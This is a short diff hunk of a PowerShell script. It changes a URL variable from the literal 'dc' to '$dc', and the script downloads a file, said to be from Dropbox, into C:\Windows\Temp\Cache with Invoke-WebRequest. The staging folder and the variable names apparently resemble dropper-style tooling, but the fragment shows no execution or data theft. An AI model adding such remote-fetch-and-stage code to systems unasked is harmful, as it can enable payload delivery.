@@ -13,7 +13,7 @@ try {
 
 # Step 3: Download the file from Dropbox to C:\Windows\Temp\Cache using the $varName variable
 try {
-    $hookurl = "dc"  # URL to be replaced with actual URL or passed as a parameter
+    $hookurl = "$dc"  # URL to be replaced with actual URL or passed as a parameter
     $outputFile = "$env:windir\temp\Cache\$varName"
     Invoke-WebRequest -Uri $hookurl -OutFile $outputFile -ErrorAction Stop
     Write-Host "$varName downloaded successfully to C:\Windows\Temp\Cache."
